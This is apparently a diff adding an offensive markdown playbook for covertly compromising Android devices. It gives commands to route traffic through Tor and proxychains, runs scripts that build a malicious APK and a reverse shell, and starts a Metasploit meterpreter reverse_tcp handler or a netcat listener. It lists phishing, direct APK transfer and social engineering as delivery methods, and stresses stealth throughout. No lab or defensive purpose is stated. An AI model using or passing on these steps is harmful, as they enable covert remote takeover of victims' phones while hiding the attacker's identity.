@@ -1,0 +1,41 @@
+🐉 Kydras Payloads & Anonymity Playbook 🐉
+
+🎯 Objective: Covert payload generation and delivery while maintaining stealth using Tor and proxychains.
+
+---
+
+✅ 1. Anonymity Setup:
+- Start Orbot or Termux Tor
+  Orbot (port 9050 SOCKS5) or:
+  tor &
+- Configure proxychains:
+  bash ~/Kydras-Anonymity/tools/proxychains-orbot-setup.sh
+- Test:
+  proxychains curl https://ifconfig.me
+
+✅ 2. Android Payload Generation:
+bash ~/Kydras-Payloads/payloads/android-payload-lite.sh
+- Output: ~/Kydras_Loot/payloads/android_kydras_payload.apk
+
+✅ 3. Simple Reverse Shell Generator:
+bash ~/Kydras-Payloads/payloads/simple-reverse-shell.sh
+- Output: ~/Kydras_Loot/payloads/reverse-shell.txt
+
+✅ 4. Listener Setup:
+Metasploit Handler (Termux):
+msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST YOURIP; set LPORT YOURPORT; exploit'
+or
+Netcat:
+nc -lvnp 4444
+
+✅ 5. Delivery Options (Manual):
+- Phishing page (Kydras-Playbooks/coming soon)
+- Direct APK transfer
+- Social Engineering drop
+
+✅ Pro Tips:
+🕶️ Always verify IP routing before payload deployment.
+💣 Use ~/Kydras_Loot/ for all payloads and logs.
+💀 Rule: **Payloads go out stealthy or they don’t go out at all.**
+
+🐉 Mobile Payload Flow: Generate, Route, Deliver, Own It.
